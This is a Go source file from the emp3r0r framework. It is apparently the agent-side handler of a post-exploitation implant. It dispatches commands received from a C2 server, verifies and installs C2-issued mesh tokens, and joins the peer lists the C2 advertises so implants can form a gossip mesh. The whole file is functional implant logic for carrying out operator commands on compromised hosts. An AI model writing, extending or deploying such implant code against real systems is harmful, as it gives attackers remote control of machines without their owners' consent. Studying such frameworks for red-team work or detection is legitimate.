package handler

import (
	"fmt"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/mesh"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

// HandleC2Command dispatches commands received from the C2 server.
func HandleC2Command(cmdData *def.MsgTunData) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("HandleC2Command panic: %v", r)
		}
	}()

	// Post-handshake session state: router token and/or peer list.
	if cmdData.Tag == def.TagSessionInfo {
		if cmdData.AgentToken != nil {
			handleAgentToken(cmdData.AgentToken)
		}
		handlePeerList(cmdData.EnrichedPeerList)
		return
	}

	job_id := cmdData.JobID
	cmd_argc := len(cmdData.CmdSlice)
	if cmd_argc == 0 {
		// A command frame with no command words (e.g. a keep-alive or a
		// whitespace-only operator command that parsed to nothing) must not
		// panic the handler on cmdSlice[0].
		logging.Warningf("HandleC2Command: empty command frame (job %q), ignoring", job_id)
		return
	}
	cmdSlice := append(cmdData.CmdSlice, []string{"--job_id", job_id}...)
	if cmd_argc < 0 {
		logging.Warningf("Invalid command: %v", cmdSlice)
	}
	logging.Debugf("Received command: %v", cmdSlice)
	command := CoreCommands()
	is_builtin := strings.HasPrefix(cmdSlice[0], "!")
	if is_builtin {
		command = C2Commands()
	}
	command.SetArgs(cmdSlice)
	command.SetOut(logging.Writer())
	command.SetErr(logging.Writer())
	err := command.Execute()
	if err != nil {
		c2transport.NotifyC2(command, "Error: %v", err)
	}
}

// handleAgentToken verifies and installs a C2-issued mesh router token.
func handleAgentToken(tok *def.AgentToken) {
	payload := fmt.Sprintf("%s%s%s%d", tok.AgentID, tok.IP, tok.Capability, tok.ExpiresAt)
	valid, err := transport.VerifySignatureWithCA([]byte(payload), tok.Signature)
	if err != nil || !valid {
		logging.Errorf("HandleC2Command: AgentToken signature invalid: %v", err)
		return
	}
	common.RuntimeConfig.MyAgentToken = tok
	logging.Successf("AgentToken received (cap=%s, expires=%v)", tok.Capability, time.Unix(tok.ExpiresAt, 0))
	// Re-broadcast gossip NodeMeta immediately so peers in the mesh cluster
	// see our updated token without waiting for the next push-pull cycle.
	mesh.UpdateGossipMeta()
}

// handlePeerList joins the mesh gossip addresses advertised by C2. The list is
// authenticated by the PFS tunnel, so no additional signature check is needed.
func handlePeerList(list *def.EnrichedPeerList) {
	if list == nil || len(list.Peers) == 0 {
		return
	}
	logging.Infof("Received peer list (%d peers)", len(list.Peers))
	peerAddrs := make([]string, 0)
	for _, ep := range list.Peers {
		port := ep.MeshGossipPort
		if port == "" {
			port = "7946"
		}
		fromIP := strings.Split(ep.From, ":")[0]
		if fromIP != "" && fromIP != "127.0.0.1" {
			peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", fromIP, port))
		}
		for _, ip := range ep.IPs {
			if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") {
				peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", ip, port))
			}
		}
	}
	if len(peerAddrs) > 0 {
		mesh.Join(peerAddrs)
	}
}
